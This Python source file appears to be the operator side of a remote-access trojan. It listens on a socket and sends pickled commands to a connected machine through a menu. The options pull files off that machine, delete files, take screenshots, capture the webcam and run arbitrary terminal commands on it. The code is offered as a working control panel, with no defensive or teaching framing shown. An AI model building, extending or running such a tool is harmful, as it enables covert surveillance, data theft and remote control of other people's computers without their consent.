import socket
import pickle
from datetime import datetime


class server:
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port

        self.buffer_size = 1024
        
        self.run()

    def run(self):
        self.server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.server.bind((self.ip,self.port))

        self.server.listen()

        self.client,self.address = self.server.accept()

        print(self.address)

    def getname(self, option=1):
        now = datetime.now()

        dt_string = now.strftime("%d-%m-%Y %H-%M-%S")
    
        if option==1:
            return "Screenshot " + dt_string + '.png'
        elif option==2:
            return "Cam " + dt_string + '.png' 
        else:
            return dt_string + '.png' 
        
    def sendcommand(self, cmd, arg):
        command = pickle.dumps([cmd,arg])
        self.client.send(command)

    def send_file(self, hostfilename, destinationfilename):
        command = pickle.dumps(['recv',destinationfilename])
        self.client.send(command)

        with open(hostfilename,'rb') as f:
            buffer = f.read(self.buffer_size)

            while buffer:
                self.client.send(buffer)
                buffer = f.read(self.buffer_size)

            self.reconnect()

    def receive_file(self, hostfilename, destinationfilename):
        command = pickle.dumps(['send',destinationfilename])
        self.client.send(command)

        with open(hostfilename,'wb') as f:
            buffer = self.client.recv(self.buffer_size)

            while buffer:
                f.write(buffer)
                buffer = self.client.recv(self.buffer_size)

            self.reconnect()

    def screenshot(self):
        hostfilename = self.getname(1)
        print(hostfilename)
        command = pickle.dumps(['screenshot'])
        self.client.send(command)

        with open(hostfilename,'wb') as f:
            buffer = self.client.recv(self.buffer_size)

            while buffer:
                f.write(buffer)
                buffer = self.client.recv(self.buffer_size)

        self.reconnect()

    def camcapture(self):
        hostfilename = self.getname(2)
        print(hostfilename)
        command = pickle.dumps(['camcapture'])
        self.client.send(command)

        with open(hostfilename,'wb') as f:
            buffer = self.client.recv(self.buffer_size)

            while buffer:
                f.write(buffer)
                buffer = self.client.recv(self.buffer_size)

        self.reconnect()

    def terminal(self,argument):
        filename = 'terminalout.txt'

        command = pickle.dumps(['terminal',argument])
        self.client.send(command)

        with open(filename,'wb') as f:
            buffer = self.client.recv(self.buffer_size)

            while buffer:
                f.write(buffer)
                buffer = self.client.recv(self.buffer_size)

        self.reconnect()


    def close_connection(self):
        print('closing connection...')
        self.sendcommand('exit','')
        self.client.shutdown(socket.SHUT_WR)
        self.client.close()
        print('connection closed')

    def reconnect(self):
        print('reconnecting...')
        self.close_connection()
        self.client,self.address = self.server.accept()
        print('connected to ' + self.address[0])



serv = server('192.168.184.1',5050)

while True:
    print('1.send file\n2.recieve file\n3.remove\n4.screenshot\n5.camera capture')
    print('6.archive directory\n7.extract zip\n8.terminal\n9.exit\n\n')

    choice = int(input('enter your choice: '))

    if choice==1:
        hostfilename = input('enter host filename: ')
        destinationfilename = input('enter destination filename: ')
        serv.send_file(hostfilename,destinationfilename)

    elif choice==2:
        hostfilename = input('enter host filename: ')
        destinationfilename = input('enter destination filename: ')
        serv.receive_file(hostfilename,destinationfilename)

    elif choice==3:
        filename = input('enter path of file to remove: ')
        serv.sendcommand('remv',filename)

    elif choice==4:
        serv.screenshot()

    elif choice==5:
        serv.camcapture()

    elif choice==6:
        directory = input('enter path of directory to archive: ')
        serv.sendcommand('archive',directory)

    elif choice==7:
        filename = input('enter path of zipfile to extract: ')
        serv.sendcommand('extract',filename)

    elif choice==8:
        command = input("enter the command to execute: ")
        serv.terminal(command)

    elif choice==9:
        serv.close_connection()
        break

    else:
        print('invalid choice')

